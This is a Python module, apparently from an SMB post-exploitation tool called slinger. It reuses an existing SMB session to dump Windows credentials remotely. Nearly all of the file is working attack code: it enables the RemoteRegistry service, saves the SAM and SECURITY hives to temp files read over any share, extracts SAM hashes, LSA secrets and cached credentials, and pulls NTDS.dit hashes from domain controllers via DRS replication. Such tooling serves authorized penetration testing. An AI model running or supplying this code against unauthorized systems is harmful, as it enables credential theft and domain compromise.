import logging
import random
import string
import sys
import time

from slingerpkg.utils.printlib import *

# Suppress impacket's console logging — slinger uses print_debug/print_info instead
logging.getLogger("impacket").setLevel(logging.WARNING)
logging.getLogger("DailyFileLogger").propagate = False


class _SlingerRemoteFile:
    """Drop-in replacement for impacket's RemoteFile that reads/deletes via any share.

    Impacket's RemoteFile hardcodes ADMIN$ for reading and deleting hive dumps.
    This version uses whatever share+path the caller specifies, so secretsdump
    works when connected to C$, ADMIN$, or any other share.
    """

    def __init__(self, smbConnection, fileName, share="ADMIN$"):
        self.__smbConnection = smbConnection
        self.__fileName = fileName
        self.__share = share
        self.__tid = self.__smbConnection.connectTree(share)
        self.__fid = None
        self.__currentOffset = 0

    def open(self):
        tries = 0
        while True:
            try:
                from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ

                self.__fid = self.__smbConnection.openFile(
                    self.__tid,
                    self.__fileName,
                    desiredAccess=FILE_READ_DATA,
                    shareMode=FILE_SHARE_READ,
                )
            except Exception as e:
                if "STATUS_SHARING_VIOLATION" in str(e):
                    if tries >= 3:
                        raise
                    time.sleep(5)
                    tries += 1
                else:
                    raise
            else:
                break

    def seek(self, offset, whence):
        if whence == 0:
            self.__currentOffset = offset

    def read(self, bytesToRead):
        if bytesToRead > 0:
            data = self.__smbConnection.readFile(
                self.__tid, self.__fid, self.__currentOffset, bytesToRead
            )
            self.__currentOffset += len(data)
            return data
        return b""

    def close(self):
        if self.__fid is not None:
            self.__smbConnection.closeFile(self.__tid, self.__fid)
            self.__smbConnection.deleteFile(self.__share, self.__fileName)
            self.__fid = None

    def tell(self):
        return self.__currentOffset

    def __str__(self):
        return f"\\\\{self.__smbConnection.getRemoteHost()}\\{self.__share}\\{self.__fileName}"


class secrets:
    def __init__(self):
        print_debug("Secrets Module Loaded!")

    def _get_hive_paths(self, args):
        """Determine save/read paths for hive temp files based on connected share.

        Returns (reg_save_prefix, smb_read_prefix, share_name, disk_path_display).

        reg_save_prefix: path prefix for hBaseRegSaveKey (relative to %SystemRoot%\\System32)
        smb_read_prefix: path prefix for SMB read (relative to share root)
        share_name:      SMB share to use for reading
        disk_path_display: human-readable absolute disk path for logging
        """
        share = getattr(self, "share", None) or "ADMIN$"
        custom_path = getattr(args, "tmp_path", None)

        if custom_path:
            # Look up the share's disk root
            share_info_dict = self.list_shares(args=None, echo=False, ret=True)
            share_root = None
            if share_info_dict:
                for si in share_info_dict:
                    if si["name"].upper() == share.upper():
                        share_root = si["path"].rstrip("\\")
                        break

            if not share_root:
                print_bad(f"Cannot determine root path for share '{share}'")
                return None

            # Accept both absolute (C:\Windows\Temp) and share-relative (\Windows\Temp) paths
            if ":" in custom_path:
                # Absolute disk path — verify it's under the share root
                disk_path = custom_path.rstrip("\\")
                # Normalize for comparison: ensure share_root ends with separator for prefix check
                check_root = share_root.upper() + "\\"
                check_path = disk_path.upper() + "\\"
                if (
                    not check_path.startswith(check_root)
                    and disk_path.upper() != share_root.upper()
                ):
                    print_bad(
                        f"Path '{disk_path}' is not accessible from share '{share}' "
                        f"(share root: {share_root})"
                    )
                    return None
                smb_rel = disk_path[len(share_root) :].lstrip("\\")
            else:
                # Share-relative path (e.g., \Windows\Temp or Temp)
                smb_rel = custom_path.strip("\\")
                disk_path = f"{share_root}\\{smb_rel}" if smb_rel else share_root

            # Verify the path exists on the share
            try:
                check_smb = smb_rel if smb_rel else ""
                self.conn.listPath(share, check_smb + "\\*")
            except Exception:
                print_bad(
                    f"Path '{custom_path}' does not exist on share '{share}'. "
                    f"Use --tmp-path with a valid path"
                )
                return None

            # RegSaveKey path — relative to %SystemRoot%\System32
            # From C:\Windows\System32 to target: ..\\..\\<path_after_drive>
            if ":" in disk_path:
                after_drive = disk_path.split(":", 1)[1].lstrip("\\")
                reg_prefix = f"..\\..\\{after_drive}\\"
            else:
                reg_prefix = f"..\\..\\{disk_path.lstrip(chr(92))}\\"

            smb_prefix = f"{smb_rel}\\" if smb_rel else ""
            return reg_prefix, smb_prefix, share, disk_path

        # Default paths based on share type
        share_upper = share.upper()
        if share_upper == "ADMIN$":
            # ADMIN$ = C:\Windows, System32 is child → ..\\Temp\\ from System32 = C:\Windows\Temp
            return "..\\Temp\\", "Temp\\", share, "C:\\Windows\\Temp"
        elif share_upper == "C$":
            # C$ = C:\, from System32: ..\\..\\Windows\\Temp\\ but we can also use ..\\Temp\\
            # and read from C$ as Windows\\Temp\\
            return "..\\Temp\\", "Windows\\Temp\\", share, "C:\\Windows\\Temp"
        else:
            # Other shares — we need to know the share's disk root to compute paths
            share_info_dict = self.list_shares(args=None, echo=False, ret=True)
            share_root = None
            if share_info_dict:
                for si in share_info_dict:
                    if si["name"].upper() == share_upper:
                        share_root = si["path"].rstrip("\\")
                        break

            if not share_root:
                # Fall back to ADMIN$ behavior
                print_warning(
                    f"Cannot determine root for share '{share}', falling back to ADMIN$ for hive files"
                )
                return "..\\Temp\\", "Temp\\", "ADMIN$", "C:\\Windows\\Temp"

            # Default: save to share_root (e.g., D:\)
            if ":" in share_root:
                after_drive = share_root.split(":", 1)[1].lstrip("\\")
                if after_drive:
                    reg_prefix = f"..\\..\\{after_drive}\\"
                else:
                    # Drive root like D:\ → from System32: ..\\..\\
                    # But we need to be on the right drive. RegSaveKey paths are on the system drive.
                    # This won't work cross-drive. Warn and fall back.
                    drive = share_root[0].upper()
                    sys_drive = "C"  # assume system drive is C
                    if drive != sys_drive:
                        print_warning(
                            f"Share '{share}' is on drive {drive}: — hive files must be saved on the system drive. "
                            f"Falling back to ADMIN$ for temp files"
                        )
                        return "..\\Temp\\", "Temp\\", "ADMIN$", "C:\\Windows\\Temp"
                    reg_prefix = "..\\..\\"
            else:
                reg_prefix = "..\\Temp\\"

            smb_prefix = ""
            return reg_prefix, smb_prefix, share, share_root

    def secretsdump(self, args):
        """Dump secrets from the remote system using the existing SMB session.

        Uses impacket's RemoteOperations with self.conn — no new connections.
        Supports SAM hashes, LSA secrets (cached creds, service passwords),
        and NTDS.dit (domain controllers only via DRS replication).
        """
        from impacket.examples.secretsdump import (
            RemoteOperations,
            SAMHashes,
            LSASecrets,
            NTDSHashes,
        )
        from impacket.dcerpc.v5 import rrp

        # Determine what to dump
        dump_sam = getattr(args, "sam", False)
        dump_lsa = getattr(args, "lsa", False)
        dump_ntds = getattr(args, "ntds", False)
        just_dc_ntlm = getattr(args, "just_dc_ntlm", False)
        history = getattr(args, "history", False)
        output_file = getattr(args, "output", None)

        # If --ntds with --just-dc-ntlm, skip SAM/LSA
        if just_dc_ntlm:
            dump_ntds = True
            dump_sam = False
            dump_lsa = False

        # Default: SAM + LSA
        if not dump_sam and not dump_lsa and not dump_ntds:
            dump_sam = True
            dump_lsa = True

        # Require share connection
        if not self.check_if_connected():
            return

        # Resolve hive file paths for current share
        hive_paths = self._get_hive_paths(args)
        if hive_paths is None:
            return
        reg_save_prefix, smb_read_prefix, hive_share, disk_display = hive_paths
        print_debug(
            f"Hive temp files: save via RegSaveKey prefix='{reg_save_prefix}', "
            f"read via SMB share={hive_share} prefix='{smb_read_prefix}', "
            f"disk path={disk_display}"
        )

        # Collect output
        collected_secrets = []

        def secret_callback(*args):
            """Called for each extracted secret.

            SAM passes (secret,), LSA/NTDS passes (secretType, secret).
            """
            secret = args[-1] if args else None
            if secret is not None:
                print(secret)
                collected_secrets.append(str(secret))

        # Track temp files created on target for logging and change tracking
        hive_temp_files = []

        # Patched hive retrieval that uses our share-aware paths
        def _patched_retrieve_hive(remote_ops_self, hiveName):
            tmpFileName = "".join([random.choice(string.ascii_letters) for _ in range(8)]) + ".tmp"
            ans = rrp.hOpenLocalMachine(remote_ops_self._RemoteOperations__rrp)
            regHandle = ans["phKey"]
            try:
                ans = rrp.hBaseRegCreateKey(
                    remote_ops_self._RemoteOperations__rrp, regHandle, hiveName
                )
            except Exception:
                raise Exception("Can't open %s hive" % hiveName)
            keyHandle = ans["phkResult"]
            # Save to our custom path instead of hardcoded ..\\Temp\\
            save_path = reg_save_prefix + tmpFileName
            disk_file = f"{disk_display}\\{tmpFileName}"
            print_info(f"Saving {hiveName} hive to {disk_file}")
            hive_temp_files.append((hiveName, disk_file))
            rrp.hBaseRegSaveKey(remote_ops_self._RemoteOperations__rrp, keyHandle, save_path)
            rrp.hBaseRegCloseKey(remote_ops_self._RemoteOperations__rrp, keyHandle)
            rrp.hBaseRegCloseKey(remote_ops_self._RemoteOperations__rrp, regHandle)
            # Read via our share-aware RemoteFile
            read_path = smb_read_prefix + tmpFileName
            print_debug(f"Reading {hiveName} hive from: \\\\{hive_share}\\{read_path}")
            remoteFileName = _SlingerRemoteFile(
                remote_ops_self._RemoteOperations__smbConnection, read_path, hive_share
            )
            return remoteFileName

        # Use existing SMB connection — no re-auth
        use_kerberos = getattr(self, "use_kerberos", False)
        remote_ops = None
        sam_hashes = None
        lsa_secrets = None
        ntds_hashes = None

        try:
            remote_ops = RemoteOperations(self.conn, use_kerberos, kdcHost=None)

            # Monkey-patch the hive retrieval to use our paths
            import types

            remote_ops._RemoteOperations__retrieveHive = types.MethodType(
                _patched_retrieve_hive, remote_ops
            )

            # Enable registry for SAM/LSA
            if dump_sam or dump_lsa:
                print_info("Enabling RemoteRegistry service (will be restored on cleanup)...")
                remote_ops.enableRegistry()
                print_info(
                    f"Hive temp files will be saved to {disk_display} and deleted after reading"
                )
                boot_key = remote_ops.getBootKey()
                no_lm_hash = remote_ops.checkNoLMHashPolicy()

            # SAM hashes
            if dump_sam:
                print_info("Dumping SAM hashes...")
                try:
                    sam_file = remote_ops.saveSAM()
                    sam_hashes = SAMHashes(
                        sam_file, boot_key, isRemote=True, perSecretCallback=secret_callback
                    )
                    sam_hashes.dump()
                except Exception as e:
                    try:
                        error_str = str(e)
                    except TypeError:
                        error_str = repr(e)
                    print_bad(f"SAM dump failed: {error_str}")

            # LSA secrets
            if dump_lsa:
                print_info("Dumping LSA secrets...")
                try:
                    security_file = remote_ops.saveSECURITY()
                    lsa_secrets = LSASecrets(
                        security_file,
                        boot_key,
                        remote_ops,
                        isRemote=True,
                        history=history,
                        perSecretCallback=secret_callback,
                    )
                    lsa_secrets.dumpCachedHashes()
                    lsa_secrets.dumpSecrets()
                except Exception as e:
                    try:
                        error_str = str(e)
                    except TypeError:
                        error_str = repr(e)
                    print_bad(f"LSA secrets dump failed: {error_str}")

            # NTDS.dit (domain controllers only)
            if dump_ntds:
                print_info("Dumping NTDS.dit via DRS replication...")
                try:
                    # For DRS we need boot key if not already obtained
                    if not dump_sam and not dump_lsa:
                        remote_ops.enableRegistry()
                        boot_key = remote_ops.getBootKey()
                        no_lm_hash = remote_ops.checkNoLMHashPolicy()

                    # Pre-check: try to connect SAMR to verify DC
                    try:
                        domain_name = remote_ops.getMachineNameAndDomain()[1]
                        print_info(f"Domain: {domain_name}")
                        remote_ops.connectSamr(domain_name)
                        print_debug("SAMR connection established — target is a DC")
                    except Exception as e:
                        try:
                            error_str = str(e)
                        except TypeError:
                            error_str = repr(e)
                        print_bad(
                            f"Cannot connect to SAMR — target may not be a domain controller: {error_str}"
                        )
                        return

                    ntds_hashes = NTDSHashes(
                        None,
                        boot_key,
                        isRemote=True,
                        history=history,
                        noLMHash=no_lm_hash,
                        remoteOps=remote_ops,
                        justNTLM=just_dc_ntlm,
                        perSecretCallback=secret_callback,
                    )
                    ntds_hashes.dump()
                except Exception as e:
                    try:
                        error_str = str(e)
                    except TypeError:
                        error_str = repr(e)
                    if "ERROR_DS_DRA_BAD_DN" in error_str:
                        print_bad("NTDS dump failed — target may not be a domain controller")
                    else:
                        print_bad(f"NTDS dump failed: {error_str}")

            # Summary
            if collected_secrets:
                print_good(f"Extracted {len(collected_secrets)} secret(s)")

                # Save to file if requested
                if output_file:
                    with open(output_file, "w") as f:
                        f.write("\n".join(collected_secrets) + "\n")
                    print_good(f"Secrets saved to {output_file}")

                details = []
                if dump_sam:
                    details.append("SAM")
                if dump_lsa:
                    details.append("LSA")
                if dump_ntds:
                    details.append("NTDS")
                self._track("EXEC", "secretsdump", self.host, "+".join(details))
                self._track("SERVICE", "secretsdump", "RemoteRegistry", "started+restored")
                for hive_name, hive_file in hive_temp_files:
                    self._track(
                        "FILE", "secretsdump", hive_file, f"{hive_name} hive (created+deleted)"
                    )
            else:
                print_warning("No secrets extracted")

        except Exception as e:
            try:
                error_str = str(e)
            except TypeError:
                error_str = repr(e)
            print_bad(f"Secretsdump error: {error_str}")
            print_debug(f"Traceback:", sys.exc_info())

        finally:
            # Cleanup — _SlingerRemoteFile.close() deletes temp files, finish() restores service
            print_info("Cleaning up remote artifacts...")
            # Find the temp file paths for SAM and SECURITY from our tracked list
            sam_file_path = next((f for h, f in hive_temp_files if h == "SAM"), None)
            sec_file_path = next((f for h, f in hive_temp_files if h == "SECURITY"), None)
            try:
                if sam_hashes:
                    sam_hashes.finish()
                    if sam_file_path:
                        print_info(f"Deleted {sam_file_path}")
            except Exception:
                if sam_file_path:
                    print_warning(f"Cleanup failed — {sam_file_path} may remain on target")
            try:
                if lsa_secrets:
                    lsa_secrets.finish()
                    if sec_file_path:
                        print_info(f"Deleted {sec_file_path}")
            except Exception:
                if sec_file_path:
                    print_warning(f"Cleanup failed — {sec_file_path} may remain on target")
            try:
                if ntds_hashes:
                    ntds_hashes.finish()
            except Exception:
                pass
            try:
                if remote_ops:
                    remote_ops.finish()
                    print_debug("RemoteRegistry service state restored")
            except Exception:
                print_debug("RemoteRegistry cleanup failed — service may remain started")
            # RemoteOperations sets a 5-min timeout; no reliable way to restore
